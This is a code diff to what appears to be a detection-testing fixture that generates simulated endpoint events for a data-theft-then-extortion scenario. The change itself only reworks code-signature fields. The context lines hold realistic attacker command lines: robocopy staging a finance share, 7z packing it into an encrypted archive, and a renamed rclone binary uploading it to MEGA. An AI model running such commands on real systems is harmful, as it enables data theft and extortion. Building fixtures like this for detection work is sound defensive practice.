@@ -81,7 +81,8 @@ export function exfilFirstExtortionScenarioEvents() {
         "process.command_line":
           'robocopy.exe "\\\\SRV-NX-FIN01\\Shares" "C:\\ProgramData\\Adobe\\ARM\\cache\\Shares" /E /Z /R:1 /W:1 /MT:16 /NFL /NDL /NP /XF *.tmp *.log',
         "process.hash.sha256": robocopyHash,
-        "process.code_signature.status": "signed",
+        "process.code_signature.exists": true,
+        "process.code_signature.trusted": true,
         "process.integrity_level": "Medium",
         "process.parent.name": "cmd.exe",
         "process.parent.pid": "5800",
@@ -135,7 +136,8 @@ export function exfilFirstExtortionScenarioEvents() {
         "process.command_line":
           '7z.exe a -v2000m -mx1 -mhe=on -pR3c0veryK3y! "C:\\ProgramData\\Adobe\\ARM\\cache\\backup\\backup_2026_07.7z" "C:\\ProgramData\\Adobe\\ARM\\cache\\Shares\\*" -r',
         "process.hash.sha256": archiveHash,
-        "process.code_signature.status": "unsigned",
+        "process.code_signature.exists": false,
+        "process.code_signature.trusted": false,
         "process.integrity_level": "Medium",
         "process.parent.name": "cmd.exe",
         "process.parent.pid": "5800",
@@ -247,7 +249,8 @@ export function exfilFirstExtortionScenarioEvents() {
         "process.command_line":
           'AdobeARMHelper.exe copy "C:\\ProgramData\\Adobe\\ARM\\cache\\backup" mega:ClientBackup --config "C:\\ProgramData\\Adobe\\ARM\\cache\\rclone.conf" --transfers=8 --checkers=8 --contimeout=60s --low-level-retries=10',
         "process.hash.sha256": rcloneHash,
-        "process.code_signature.status": "unsigned",
+        "process.code_signature.exists": false,
+        "process.code_signature.trusted": false,
         "process.integrity_level": "Medium",
         "process.parent.name": "cmd.exe",
         "process.parent.pid": "5800",
